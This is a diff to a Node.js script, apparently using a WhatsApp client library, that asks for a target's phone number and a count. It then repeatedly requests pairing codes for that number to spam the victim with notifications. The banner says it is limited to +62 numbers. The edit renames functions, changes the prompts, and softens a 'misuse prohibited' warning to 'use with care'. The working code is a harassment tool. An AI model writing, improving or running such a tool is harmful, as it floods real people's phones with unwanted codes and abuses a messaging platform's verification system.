@@ -18,7 +18,7 @@ const question = (text) => {
     return new Promise((resolve) => { rl.question(text, resolve) });
 };
 
-async function LuciferProject() {
+async function LuciferXSatanic() {
     const { state } = await useMultiFileAuthState('./69/session');
     const LuciferBot = makeWASocket({
         logger: pino({ level: "silent" }),
@@ -35,28 +35,29 @@ async function LuciferProject() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
     try {
-        // Nomor target
-        const phoneNumber = await question(wColor + 'ターゲット番号を入力してください (例: 62xxxxxxx): ' + xColor);
+        // Minta nomor target
+        const phoneNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
+        
+        // Minta jumlah spam
+        const LuciferCodes = parseInt(await question(wColor + 'スパム回数を入力してください : ' + xColor));
 
-        // Jumlah spam
-        const totalSpam = parseInt(await question(wColor + 'スパム回数を入力してください (1-1000): ' + xColor));
-
-        if (isNaN(totalSpam) || totalSpam <= 0) {
-            console.log('例: 20 と入力してください。');
+        if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
+            console.log('例 : 20');
             return;
         }
 
-        for (let i = 0; i < totalSpam; i++) {
+        // Loop kirim pairing code
+        for (let i = 0; i < LuciferCodes; i++) {
             try {
                 let code = await LuciferBot.requestPairingCode(phoneNumber);
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(wColor + `スパムペアリングコード成功 - 番号: ${phoneNumber} 進捗: [${i + 1}/${totalSpam}]` + xColor);
+                console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
             } catch (error) {
                 console.error('エラー:', error.message);
             }
         }
     } catch (error) {
-        console.error('エラーが発生しました。');
+        console.error('エラーが発生しました');
     }
 
     return LuciferBot;
@@ -65,18 +66,18 @@ async function LuciferProject() {
 console.log(wColor + `
 実行中... spam-pairing-wa
 =========================
- • spam-pairing-wa
+ • スパムペアリングツール
  • 作成者: FlowFalcon
- • 悪用禁止
+ • 使用注意
 =========================
-┏❐ 
-┃ 【使用手順】
+┏❐
+┃ [ 以下の指示に従ってください ]
 ┃
-┃ ⭔ ターゲット番号を入力してください (例: 62xxxxxxx)
-┃ ⭔ スパム回数を入力してください (1-1000)
+┃⭔ ターゲット番号 (例: 62xxxxxxx)
+┃⭔ スパム回数 (1-1000)
 ┃
-┃ 【このツールは+62の番号のみ対応しています】
-┗❐ 
+┃ [ このツールは +62 の番号でのみ使用可能です ]
+┗❐
 =========================` + xColor);
 
-LuciferProject();
+LuciferXSatanic();
